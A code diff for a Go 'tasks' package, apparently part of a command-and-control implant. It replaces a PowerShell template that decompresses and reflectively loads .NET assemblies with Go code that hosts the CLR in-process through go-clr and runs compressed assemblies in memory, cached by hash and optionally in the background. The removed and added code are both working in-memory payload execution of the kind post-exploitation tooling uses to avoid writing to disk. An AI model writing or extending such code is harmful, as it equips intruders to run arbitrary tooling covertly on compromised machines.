@@ -1,96 +1,139 @@
 package tasks
 
-const PowerShellScript = `
-$data = "%s"
-$parts = $data.split(",");
-$params = $parts[1..$parts.length];
+import (
+	"bytes"
+	"compress/flate"
+	"crypto/sha256"
+	"errors"
+	"fmt"
+	clr "github.com/Ne0nd0g/go-clr"
+	"io"
+	"log"
+	"sync"
+)
 
-$bytes = [System.Convert]::FromBase64String($parts[0]);
+var (
+	clrInstance *CLRInstance
+	assemblies  []*assembly
+)
 
-# Create a memory stream to decompress the byte array
-$ms = New-Object System.IO.MemoryStream;
-$output = New-Object System.IO.MemoryStream
-
-$ms.Write($bytes, 0, $bytes.Length)
-$ms.Seek(0, 0) | Out-Null
-
-# Decompress the byte array using DeflateStream
-$sr = New-Object System.IO.Compression.DeflateStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
-$buffer = [System.Byte[]]::CreateInstance([System.Byte], 4096)
-$bytesRead = $sr.Read($buffer, 0, $buffer.Length)
-
-# Read from the decompressed stream into a new byte array
-while ($bytesRead -ne 0) {
-    $output.Write($buffer, 0, $bytesRead)
-    $bytesRead = $sr.Read($buffer, 0, $buffer.Length)
+type assembly struct {
+	methodInfo *clr.MethodInfo
+	hash       [32]byte
 }
 
-$assembly = [Reflection.Assembly]::Load($output.ToArray())
-
-# Check if the Task class has an OutputStream property
-$strmprop = $assembly.GetType("Task").GetProperty("OutputStream")
-
-Write-Host $strmprop
-# Execute the assembly based on whether OutputStream is available
-if (!$strmprop) {
-    Write-Host "Output pipe"
-    $Results = $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params)
-    Write-Output "Task execution results: $Results"
+type CLRInstance struct {
+	runtimeHost *clr.ICORRuntimeHost
+	sync.Mutex
 }
-else {
-    # Output pipe scenario
-    $pipeServerStream = [System.IO.Pipes.AnonymousPipeServerStream]::new([System.IO.Pipes.PipeDirection]::In, [System.IO.HandleInheritability]::Inheritable)
-    $pipeClientStream = [System.IO.Pipes.AnonymousPipeClientStream]::new([System.IO.Pipes.PipeDirection]::Out, $pipeServerStream.ClientSafePipeHandle)
-    $streamReader = [System.IO.StreamReader]::new($pipeServerStream)
 
-    # Prepare parameters for background task execution
-    $dict = @{
-        "assembly" = $assembly
-        "params" = $params
-        "pipe" = $pipeClientStream
-    }
+func (c *CLRInstance) GetRuntimeHost(runtime string) *clr.ICORRuntimeHost {
+	c.Lock()
+	defer c.Unlock()
 
-    # Create a PowerShell instance for executing the background task
-    $ps = [PowerShell]::Create()
-    $task = $ps.AddScript('
-        [CmdletBinding()]
-        param(
-            [System.Reflection.Assembly]
-            $assembly,
+	if c.runtimeHost == nil {
+		log.Printf("Initializing CLR runtime host")
+		c.runtimeHost, _ = clr.LoadCLR(runtime)
 
-            [String[]]
-            $params,
+		err := clr.RedirectStdoutStderr()
+		if err != nil {
+			log.Printf("could not redirect stdout/stderr: %v\n", err)
+		}
+	}
 
-            [IO.Pipes.AnonymousPipeClientStream]
-            $Pipe
-        )
-
-        try {
-            $streamProp = $assembly.GetType("Task").GetProperty("OutputStream")
-            $streamProp.SetValue($null, $pipe, $null)
-            $assembly.GetType("Task").GetMethod("Execute").Invoke($null, $params)
-        }
-        finally {
-            $pipe.Dispose()
-        }
-    ').AddParameters($dict).BeginInvoke()
-
-    $pipeOutput = [Text.StringBuilder]::new()
-    $buffer = [char[]]::new($pipeServerStream.InBufferSize)
-
-    # Read output from the pipe stream
-    while ($read = $streamReader.Read($buffer, 0, $buffer.Length)) {
-        [void]$pipeOutput.Append($buffer, 0, $read)
-    }
-
-    # End the background task execution and retrieve results
-    $ps.EndInvoke($task)
-    $Results = $pipeOutput.ToString()
-
-    # Cleanup resources
-    $pipeServerStream.Dispose()
-    $streamReader.Dispose()
-
-    Write-Output "$Results"
+	return c.runtimeHost
 }
-`
+
+func addAssembly(methodInfo *clr.MethodInfo, data []byte) {
+	asmHash := sha256.Sum256(data)
+	asm := &assembly{methodInfo: methodInfo, hash: asmHash}
+	assemblies = append(assemblies, asm)
+}
+
+func getAssembly(data []byte) *assembly {
+	asmHash := sha256.Sum256(data)
+	for _, asm := range assemblies {
+		if asm.hash == asmHash {
+			return asm
+		}
+	}
+	return nil
+}
+
+func LoadAssembly(data []byte, params []string, runtime string) (string, error) {
+	var methodInfo *clr.MethodInfo
+	var err error
+
+	rtHost := clrInstance.GetRuntimeHost(runtime)
+	if rtHost == nil {
+		return "", errors.New("could not load CLR runtime host")
+	}
+
+	if asm := getAssembly(data); asm != nil {
+		methodInfo = asm.methodInfo
+	} else {
+		methodInfo, err = clr.LoadAssembly(rtHost, data)
+		if err != nil {
+			log.Printf("could not load assembly: %v\n", err)
+			return "", err
+		}
+		addAssembly(methodInfo, data)
+	}
+
+	if len(params) == 1 && params[0] == "" {
+		params = []string{" "}
+	}
+	stdout, stderr := clr.InvokeAssembly(methodInfo, params)
+
+	// Will print result into terminal in a debugger because it requires a real console
+	return fmt.Sprintf("%s\n%s", stdout, stderr), nil
+}
+
+func Runcsharptask(data []byte, params []string) string {
+	compressedStream := bytes.NewReader(data)
+	var decompressedBuffer bytes.Buffer
+	deflateReader := flate.NewReader(compressedStream)
+	defer deflateReader.Close()
+
+	io.Copy(&decompressedBuffer, deflateReader)
+	decompressedData := decompressedBuffer.Bytes()
+
+	versionString := "v4.0.30319"
+
+	result, err := LoadAssembly(decompressedData, params, versionString)
+	if err != nil {
+		log.Fatalf("Error running assembly: %v", err)
+	}
+
+	return result
+}
+
+func init() {
+	clrInstance = &CLRInstance{}
+	assemblies = make([]*assembly, 0)
+}
+
+func RunCsharpTaskInBackground(data []byte, params []string, callback func(string)) {
+	go func() {
+		compressedStream := bytes.NewReader(data)
+		var decompressedBuffer bytes.Buffer
+		deflateReader := flate.NewReader(compressedStream)
+		defer deflateReader.Close()
+
+		io.Copy(&decompressedBuffer, deflateReader)
+		decompressedData := decompressedBuffer.Bytes()
+
+		versionString := "v4.0.30319"
+
+		// Run the assembly in the background
+		result, err := LoadAssembly(decompressedData, params, versionString)
+		if err != nil {
+			log.Printf("Error running assembly in background: %v", err)
+			callback("") // Send an empty string or error message if execution fails
+			return
+		}
+
+		// Call the callback function with the result when done
+		callback(result)
+	}()
+}
